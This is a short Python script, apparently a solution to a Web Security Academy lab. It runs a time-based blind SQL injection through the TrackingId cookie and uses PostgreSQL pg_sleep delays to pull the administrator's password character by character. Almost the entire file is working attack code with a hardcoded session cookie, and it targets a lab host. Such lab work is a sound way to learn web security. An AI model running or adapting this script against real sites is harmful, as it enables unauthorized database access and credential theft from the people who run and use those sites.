from termcolor import colored

import requests
import signal
import sys
import string
import time

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLi():
    time.sleep(2)

    password = ""

    for position in range(1, 21):
        for character in characters:

            cookies = {
                'TrackingId': f"test'||(select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users)--",
                'session': 'eQ7UbMqsiLlsPLGhJY24JNOSB6TnqXLB'
            }

            time_start = time.time()

            r = requests.get("https://0a9300c10347805d9b8121cd0095000e.web-security-academy.net", cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 2:
                password += character
                print({password})

if __name__ == '__main__':
    makeSQLi()
